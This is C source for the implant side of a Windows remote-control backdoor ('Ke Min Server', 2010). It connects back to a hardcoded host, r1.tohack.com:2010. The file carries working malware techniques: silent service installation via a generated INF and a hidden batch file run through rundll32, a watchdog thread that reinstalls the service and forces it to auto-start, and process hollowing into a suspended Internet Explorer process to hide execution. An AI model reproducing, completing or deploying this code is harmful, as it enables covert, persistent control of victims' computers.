/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "km_socket.h"
#include "km_main_event.h"

pshare_main g_share_main;
HANDLE g_mutex;

char g_remote_addr[512] = {"r1.tohack.com"};
char g_remote_port[64] = {"2010"};
char SERVICE_NAME[64] = {"KMS"};
char SERVICE_DISP_NAME[128] = {"Ke Min Server"};

#define SERVICE_EXE             "kms.exe"

unsigned long kms_func[] = {
    (unsigned long)kms_sock_connect,
    (unsigned long)kms_sock_ret_connect,
    (unsigned long)kms_sock_send,
    (unsigned long)kms_sock_close,
    (unsigned long)kms_file_write,
    (unsigned long)km_main_connect,
    (unsigned long)km_main_parse
};

SERVICE_STATUS m_ServiceStatus;

/*

SERVICE_STATUS_HANDLE m_ServiceStatusHandle;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);

SERVICE_TABLE_ENTRY DispatchTable[2] =
{
    {SERVICE_NAME, ServiceMain},
    { 0, 0}
};
//*/

int bat_install_service();

unsigned short get_oversion()
{
    OSVERSIONINFO oversioninfo;
    memset(&oversioninfo,0x0,sizeof(OSVERSIONINFO));
    oversioninfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    if(GetVersionEx(&oversioninfo) == 0)
        return 0;
    switch(oversioninfo.dwMajorVersion)
    {
    case 4: //win98
        {
            switch(oversioninfo.dwMinorVersion)
            {
            case 0:  return 1; //Windows 95/NT4.0
            case 10: return 2; //windows 98
            case 90: return 3; //Windows Me
            }
        }
        break;
    case 5: //2000 to 2003 xp
        {
            switch(oversioninfo.dwMinorVersion)
            {
            case 0: return 4; //Windows 2000
            case 1: return 5; //Windows Xp
            case 2: return 6; //windows 2003
            }
        }
        break;
    case 6: //vista to 2008
        {
            return 7;         //Windows vista/2008
        }
        break;
    }
    return 0;
}

int
main_process_safe()
{
   // char file_path[MAX_PATH];
    //sprintf(file_path, "%s%s", temp_path, SERVICE_EXE);
    //HANDLE hToken;
    //TOKEN_PRIVILEGES tkp;
    HANDLE hFile;//, hTargetHandle;

    /*HANDLE hProcess = GetCurrentProcess();

    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        }
        CloseHandle(hToken);
    }

    hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, 4);
    if (hProcess == NULL) {
        return -1;
    }*/

    //GetModuleFileName(NULL, file_path, MAX_PATH);

    hFile = CreateFile(g_share_main->km_exe_path_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        //CloseHandle(hProcess);
        return -1;
    }

    //DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), hProcess, &hTargetHandle, 0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);
    //CloseHandle(hFile);
   // CloseHandle(hTargetHandle);
    //
   //CloseHandle(hProcess);
    return 0;
}

unsigned __stdcall
service_monitor(void *param)
{
    LPQUERY_SERVICE_CONFIG lpcnfg;
    lpcnfg = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 4096*2);
    DWORD Size;//, dwTagId;
    for (;;) {
        SC_HANDLE hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        SC_HANDLE hService = OpenService(hManager, SERVICE_NAME, SC_MANAGER_ALL_ACCESS);
        if (hService != NULL) {
            memset(lpcnfg, 0, 4096*2);
            if (QueryServiceConfig(hService, lpcnfg, 4096*2, &Size)) {
                if (lpcnfg->dwStartType != SERVICE_AUTO_START) {
                    if (!ChangeServiceConfig(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
                        ///printf("c error:%d", GetLastError());
                    }
                }
            }
            CloseServiceHandle(hService);
        } else {
            bat_install_service();
        }
        CloseServiceHandle(hManager);
        Sleep(10000);
    }
    return 0;
}

int
main_initialize()
{
    char *temp_malloc;
    g_share_main = malloc(sizeof(share_main));
    memset(g_share_main, 0x0, sizeof(share_main));

    g_share_main->remote_addr = g_remote_addr;
    g_share_main->remote_port = atoi(g_remote_port);

    g_share_main->sock_loop_thread_count = 4;
    g_share_main->sock_loop_thread = malloc(sizeof(HANDLE) * g_share_main->sock_loop_thread_count);

    g_share_main->km_length = 1048576;
    g_share_main->km_buffer = malloc(g_share_main->km_length);

    g_share_main->c_ver.wVersion = 0x1013;
    g_share_main->c_ver.wSystemVersion = get_oversion();
    g_share_main->c_ver.c_type = 0x2;

    g_share_main->s_func.kms_func = kms_func;

    temp_malloc = malloc(MAX_PATH);
    memset(temp_malloc, 0x0, MAX_PATH);

    GetWindowsDirectory(temp_malloc, MAX_PATH);
    strcat(temp_malloc, "\\temp\\");

    g_share_main->km_cur_path = temp_malloc;
    g_share_main->km_mod_path = temp_malloc;

    g_share_main->km_exe_path_name = malloc(MAX_PATH);
    memset(g_share_main->km_exe_path_name, 0x0, MAX_PATH);
    sprintf(g_share_main->km_exe_path_name, "%s%s", temp_malloc, SERVICE_EXE);

    main_process_safe();

    CloseHandle((HANDLE)_beginthreadex(NULL, 0, service_monitor, NULL, 0, NULL));
    return 1;
}



unsigned __stdcall
service_main(void *param)
{
    g_mutex = CreateMutex(NULL, FALSE, SERVICE_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        //MessageBox(NULL, "CreateMutex NULL", 0, 0);
        CloseHandle(g_mutex);
        return 0;
    }
    main_initialize();
    kms_main_initialize();
    kms_sock_connect(g_share_main->remote_addr, g_share_main->remote_port, km_main_connect, kms_main_destroy, NULL);
    WaitForSingleObject(g_share_main->sock_loop_thread[0],INFINITE);    return 0;
}

/*
void WINAPI ServiceCtrlHandler(DWORD Opcode)//服务控制函数
{
	switch(Opcode)
	{
	case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
		m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:  // we got the command to continue
		m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP:   // we got the command to stop this service
		m_ServiceStatus.dwWin32ExitCode = 0;
		m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		m_ServiceStatus.dwCheckPoint = 0;
		m_ServiceStatus.dwWaitHint = 0;
		SetServiceStatus (m_ServiceStatusHandle,&m_ServiceStatus);
		//SetEvent(g_exit_event);
		//WaitForSingleObject(g_exit_event,5000);
		break;
	case SERVICE_CONTROL_INTERROGATE: //
		break;
	}
	return;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
	m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	m_ServiceStatus.dwWin32ExitCode = 0;
	m_ServiceStatus.dwServiceSpecificExitCode = 0;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME,ServiceCtrlHandler);
	if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0) {
        return;
	}
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; //设置服务状态
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;

    //SERVICE_STATUS结构含有七个成员，它们反映服务的现行状态。
    //所有这些成员必须在这个结构被传递到SetServiceStatus之前正确的设置
    SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);

    //CmdStart(); //启动我们的服务程序

	CloseHandle((HANDLE)_beginthreadex(NULL,0,service_main,NULL,0,0));
	return;
}*/

int delete_service()
{
    SC_HANDLE hManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = OpenService(hManager,SERVICE_NAME,SC_MANAGER_ALL_ACCESS);
    if (hService != NULL) {
        ControlService(hService,SERVICE_CONTROL_STOP,&m_ServiceStatus);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hManager);
    return 0;
}

int update_service(char *servername)
{
    LPQUERY_SERVICE_CONFIG   lpcnfg;
    DWORD   qResult,Size;
    char    path[MAX_PATH]={0};
    char    spath[MAX_PATH]={0};
    char    *find;

    SC_HANDLE hManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = OpenService(hManager,servername,SC_MANAGER_ALL_ACCESS);

    if(hService != NULL){
        ControlService(hService, SERVICE_CONTROL_STOP, &m_ServiceStatus);

        lpcnfg  =  (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR,4096*2);
        memset(lpcnfg,0,4096*2);
        qResult = QueryServiceConfig(hService, lpcnfg, 4096*2, &Size);

        strcpy(spath, lpcnfg->lpBinaryPathName);
        find = strrchr(spath,' ');
        if(find != NULL)
            *find = '\0';
        LocalFree(lpcnfg);

        GetModuleFileName(NULL, path, MAX_PATH);
        //printf("%s:%s\n",path,spath);
        while (!CopyFile(path, spath, FALSE))
            Sleep(5000);

        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    }

    CloseServiceHandle(hManager);
    return 0;
}

int bat_install_service()
{
    char ini_buf[4096] = {0};
    char win[MAX_PATH]={0};
    char ini_path[MAX_PATH] = {0};
    char bat_path[MAX_PATH] = {0};

    GetWindowsDirectory(win,MAX_PATH);
    strcat(win, "\\temp\\");
    sprintf(ini_path, "%skm.inf", win);
    sprintf(bat_path, "%skm.bat", win);
    strcat(win, SERVICE_EXE);
    strcat(win," nt");

    sprintf(ini_buf, "[Version]\r\nSignature=\"$WINDOWS NT$\"\r\n[DefaultInstall.Services]\r\nAddService=%s,,km_server\r\n[km_server]\r\nDisplayName=%s\r\nDescription=%s\r\nServiceType=0x10\r\nStartType=2\r\nErrorControl=0\r\nServiceBinary=%s\r\n",
                SERVICE_NAME, SERVICE_NAME, SERVICE_DISP_NAME, win);
    kms_file_write(ini_path, ini_buf, strlen(ini_buf));

    sprintf(ini_buf, "rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 %s", ini_path);
    kms_file_write(bat_path, ini_buf, strlen(ini_buf));
    /*if (SetupCopyOEMInf(ini_path, NULL, SPOST_PATH, SP_COPY_NEWER_OR_SAME, NULL, 0, NULL, NULL) == FALSE)
        MessageBox(NULL, "install inf error", 0, 0);*/
    //
    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_information;
    memset(&startup_info, 0x0, sizeof(STARTUPINFO));
    startup_info.cb  =   sizeof(STARTUPINFO);
    startup_info.dwFlags   =   STARTF_USESHOWWINDOW;
    startup_info.wShowWindow   =   SW_HIDE;

    if (CreateProcess(NULL, bat_path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE|NORMAL_PRIORITY_CLASS, NULL, NULL, &startup_info, &process_information)) {
        WaitForSingleObject(process_information.hProcess, INFINITE);
    }

    DeleteFile(ini_path);
    DeleteFile(bat_path);
    return 0;
}

int install_service()
{
    char win[MAX_PATH]  ={0};
    char path[MAX_PATH] ={0};
    char temp[MAX_PATH] ={0};

    SC_HANDLE hManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = OpenService(hManager, SERVICE_NAME, SC_MANAGER_ALL_ACCESS);

    GetModuleFileName(NULL, path, 1024);

    if (hService != NULL) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hManager);
        //delete_service();

        sprintf(temp, "%s update", path);
        WinExec(temp, SW_SHOW);

        return 0;
    }

    GetWindowsDirectory(win, MAX_PATH);
    strcat(win, "\\temp\\");
    strcat(win, SERVICE_EXE);

    bat_install_service();

    CopyFile(path, win, FALSE);
    //rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:\boot\system.inf

    //WinExec(ini_buf, SW_SHOW);

    hService = OpenService(hManager, SERVICE_NAME, SC_MANAGER_ALL_ACCESS);
    //hService = CreateService(hManager,SERVICE_NAME,SERVICE_DISP_NAME,SC_MANAGER_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,0,win,NULL,NULL,NULL,NULL,NULL);
    if (hService != NULL) {
        StartService(hService, 0, NULL);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hManager);
    return 0;
}


typedef NTSTATUS (__stdcall *pfnZwUnmapViewOfSection)(
        IN HANDLE ProcessHandle,
        IN LPVOID BaseAddress
        );
BOOL CreateIEProcess();
PROCESS_INFORMATION pi  = {0};
DWORD GetCurModuleSize(DWORD dwModuleBase);
DWORD GetRemoteProcessImageBase(DWORD dwPEB);
DWORD GetNewEntryPoint();
void TestFunc();
//////////////////////////////////////////////////////////////////////////
pfnZwUnmapViewOfSection ZwUnmapViewOfSection;

int test()
{
        ZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwUnmapViewOfSection");
        //printf("ZwUnmapViewOfSection : 0x%08X.\n",ZwUnmapViewOfSection);
        if (!ZwUnmapViewOfSection) {
                //printf("Get ZwUnmapViewOfSection Error.\n");
                goto __exit;
        }
        if (!CreateIEProcess()) {
                goto __exit;
        }

        //printf("TargetProcessId : %d.\n",pi.dwProcessId);

        HMODULE hModuleBase = GetModuleHandleA(NULL);
        //printf("hModuleBase : 0x%08X.\n",hModuleBase);
        DWORD dwImageSize = GetCurModuleSize((DWORD)hModuleBase);
        //printf("ModuleSize : 0x%08X\n",dwImageSize);

        CONTEXT ThreadCxt;
        ThreadCxt.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread,&ThreadCxt);
        //printf("Target PEB Addr : 0x%08X.\n",ThreadCxt.Ebx);
        DWORD dwRemoteImageBase = GetRemoteProcessImageBase(ThreadCxt.Ebx);
        //printf("RemoteImageBase : 0x%08X.\n",dwRemoteImageBase);

        ZwUnmapViewOfSection(pi.hProcess,(LPVOID)dwRemoteImageBase);

        LPVOID lpAlloAddr = VirtualAllocEx(pi.hProcess, hModuleBase, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if ( !lpAlloAddr)
            goto __exit;
        /*if ( lpAlloAddr )
         {
                //printf("Alloc Remote Addr OK.\n");
         }
        else
        {
                //printf("Alloc Remote Addr Error.\n");
         }*/

        WriteProcessMemory(pi.hProcess,hModuleBase, hModuleBase, dwImageSize, NULL );
        //printf("Write Image data OK.\n");
        ThreadCxt.ContextFlags = CONTEXT_FULL;
        ThreadCxt.Eax = GetNewEntryPoint();
        SetThreadContext(pi.hThread,&ThreadCxt);
        ResumeThread(pi.hThread);
        return 1;
        //printf("finished.\n");
__exit:
        //TerminateProcess(pi.hProcess,0);
        //system("pause");
        return 0;
}

BOOL CreateIEProcess()
{
    char ie_path[MAX_PATH] = {0};
    GetWindowsDirectory(ie_path, MAX_PATH);
    strcpy(&ie_path[3], "Program Files\\Internet Explorer\\IEXPLORE.EXE");

    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    BOOL bRet;

    bRet = CreateProcess(NULL, ie_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi );
    /*if ( bRet )
            printf("Create IE Ok.\n");
    else
            printf("Create IE error.\n");*/
    return bRet;
}

DWORD GetCurModuleSize(DWORD dwModuleBase)
{
        PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)dwModuleBase;
        PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)(dwModuleBase + pDosHdr->e_lfanew);
        return pNtHdr->OptionalHeader.SizeOfImage;
}

DWORD GetRemoteProcessImageBase(DWORD dwPEB)
{
        DWORD dwBaseRet;
        ReadProcessMemory(pi.hProcess,(LPVOID)(dwPEB+8),&dwBaseRet,sizeof(DWORD),NULL);
        return dwBaseRet;
/*
lkd> dt_peb
nt!_PEB
+0x000 InheritedAddressSpace : UChar
+0x001 ReadImageFileExecOptions : UChar
+0x002 BeingDebugged     : UChar
+0x003 BitField          : UChar
+0x003 ImageUsesLargePages : Pos 0, 1 Bit
+0x003 SpareBits         : Pos 1, 7 Bits
+0x004 Mutant            : Ptr32 Void
+0x008 ImageBaseAddress : Ptr32 Void
*/
}

void TestFunc()
{
    service_main(NULL);
    //    MessageBox(0,"Injected OK","123",0);
}

DWORD GetNewEntryPoint()
{
        return (DWORD)TestFunc;
}

int main(int argc, char *argv[])
{
    /*u_long t1 = timeGetTime();
    Sleep(1000*60*9);
    printf("%d\n", timeGetTime()-t1);
    return -1;*/
    //update_service(SERVICE_NAME);
    //*
    //test();
    //service_monitor(NULL);

    char e_path[MAX_PATH] = {0};
    char path[MAX_PATH] = {0};
    if (argc > 1) {
        if(strcmp(argv[1],"nt") ==0){
            if (!test()) {
                GetModuleFileName(NULL, path, MAX_PATH);
                sprintf(e_path, "rundll32 SHELL32.DLL,ShellExec_RunDLL %s%s", path, " exec");
                WinExec(e_path, SW_SHOW);
            }
            //StartServiceCtrlDispatcher(DispatchTable);
        }
        else if(strcmp(argv[1],"del") == 0){
            delete_service();
        }
        else if(strcmp(argv[1],"install") ==0){
            install_service();
        }
        else if(strcmp(argv[1],"update") ==0){
            update_service(SERVICE_NAME);
        }
        else if(strcmp(argv[1],"exec") == 0){
            service_main(NULL);
        }
        return 1;
    }

    GetModuleFileName(NULL, path, MAX_PATH);
    sprintf(e_path, "rundll32 SHELL32.DLL,ShellExec_RunDLL %s%s", path, " install");
    WinExec(e_path, SW_SHOW);//*/

    //service_main(NULL);
/*
    int i=0;
    for(i=0;i<2000;i++)
        Sleep(1);
    for(i=0;i<2000;i++)
        Sleep(1);
    for(i=0;i<2000;i++)
        Sleep(1);
    for(i=0;i<2000;i++)
        Sleep(1);
    for(i=0;i<2000;i++)
        Sleep(1);

    install_service();*/
    return 0;
}
